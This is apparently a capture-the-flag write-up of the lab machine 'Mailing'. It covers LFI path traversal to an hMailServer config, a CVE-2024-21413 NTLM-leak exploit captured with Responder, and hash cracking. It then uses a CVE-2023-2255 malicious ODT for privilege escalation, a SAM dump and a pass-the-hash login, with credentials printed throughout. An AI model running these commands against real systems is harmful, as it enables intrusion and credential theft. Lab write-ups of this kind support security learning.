## Reconnaissance

The engagement started with a port scan against the target host. Due to the scan taking a long time, the scope was reduced to speed up the process.

```bash
nmap 10.10.11.14 -Pn -sC -sV -A -T4 -oN scan.txt
```

After identifying the available services, attention was shifted to the web application. By inspecting the source code, it was observed that a PHP download function was being used to retrieve files from the server, which indicated a Local File Inclusion vulnerability.

Using this functionality, sensitive configuration files were accessed directly from the system.

```bash
http://mailing.htb/download.php?file=../../../Program+Files(x86)/hMailServer/Bin/hMailServer.INI
```

![Using this functionality, sensitive configuration files were accessed directly from the system](/assets/images/mailing/73-1.png)
*Using this functionality, sensitive configuration files were accessed directly from the system*

## Enumeration / Analysis

Inside the retrieved configuration files, the password hash for the default administrator account was discovered.

Administrator password hash: 841bb5acfa6779ae432fd7a4e6600ba7

![Administrator password hash: 841bb5acfa6779ae432fd7a4e6600ba7](/assets/images/mailing/73-2.png)
*Administrator password hash: 841bb5acfa6779ae432fd7a4e6600ba7*

Using hash-identifier, it was determined that the hash format corresponded to MD5.

![Using hash-identifier, it was determined that the hash format corresponded to MD5](/assets/images/mailing/73-3.png)
*Using hash-identifier, it was determined that the hash format corresponded to MD5*

Further research revealed that the system was vulnerable to CVE-2024-21413, and valid SMTP credentials were already available.

## Exploitation

The vulnerability was exploited using a public proof-of-concept script. The attack leveraged SMTP authentication to trigger an outbound authentication request.

```python
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\<ip>' --subject XD
```

The authentication attempt was captured using Responder running on the attacker machine.

```bash
sudo responder -I tun0
```

Captured hashes were stored in the Responder logs directory.

```bash
/usr/share/responder/logs
```

![Captured hashes were stored in the Responder logs directory](/assets/images/mailing/73-4.png)
*Captured hashes were stored in the Responder logs directory*

![Captured hashes were stored in the Responder logs directory](/assets/images/mailing/73-5.png)
*Captured hashes were stored in the Responder logs directory*

The captured hash was cracked using hashcat, revealing the plaintext password for the user maya.

```bash
hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
```

![The captured hash was cracked using hashcat, revealing the plaintext password for the user maya](/assets/images/mailing/73-6.png)
*The captured hash was cracked using hashcat, revealing the plaintext password for the user maya*

With valid credentials, SMB enumeration was performed to identify accessible shares.

```bash
smbclient -L 10.10.11.14 -U 'maya'
```

![With valid credentials, SMB enumeration was performed to identify accessible shares](/assets/images/mailing/73-7.png)
*With valid credentials, SMB enumeration was performed to identify accessible shares*

A remote session was established using Evil-WinRM with the compromised credentials.

```bash
evil-winrm -i 10.10.11.14 -u 'maya' -p m4y4ngs4ri
```

![A remote session was established using Evil-WinRM with the compromised credentials](/assets/images/mailing/73-8.png)
*A remote session was established using Evil-WinRM with the compromised credentials*

## Privilege Escalation

Further analysis showed that privilege escalation was possible by abusing CVE-2023-2255.

![Further analysis showed that privilege escalation was possible by abusing CVE-2023-2255](/assets/images/mailing/73-10.png)
*Further analysis showed that privilege escalation was possible by abusing CVE-2023-2255*

A malicious document was generated to add the user maya to the local Administrators group upon execution.

```python
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```

An SMB server was started on the attacker machine to transfer the exploit file.

```bash
impacket-smbserver mailing `pwd` -smb2support
```

The exploit document was copied into the target system under the Important Documents directory.

![The exploit document was copied into the target system under the Important Documents directory](/assets/images/mailing/73-11.png)
*The exploit document was copied into the target system under the Important Documents directory*

```bash
net use \\<IP>\mailing
copy \\<IP>\mailing\exploit.odt
```

![The exploit document was copied into the target system under the Important Documents directory](/assets/images/mailing/73-12.png)
*The exploit document was copied into the target system under the Important Documents directory*

After execution, the group membership was verified, confirming that maya had been added to the local Administrators group.

```bash
net user maya
```

![Confirming maya's group membership with net user](/assets/images/mailing/73-13.png)
*Confirming maya's group membership with net user*

With administrative privileges, the SAM database was dumped using crackmapexec.

```bash
crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
```

![With administrative privileges, the SAM database was dumped using crackmapexec](/assets/images/mailing/73-14.png)
*With administrative privileges, the SAM database was dumped using crackmapexec*

Finally, authentication was performed as the local administrator using pass-the-hash, achieving full system compromise.

```bash
impacket-wmiexec localadmin@10.10.11.14 -hashes "<hashes>"
```

![Finally, authentication was performed as the local administrator using pass-the-hash, achieving full system compromise](/assets/images/mailing/73-15.png)
*Finally, authentication was performed as the local administrator using pass-the-hash, achieving full system compromise*
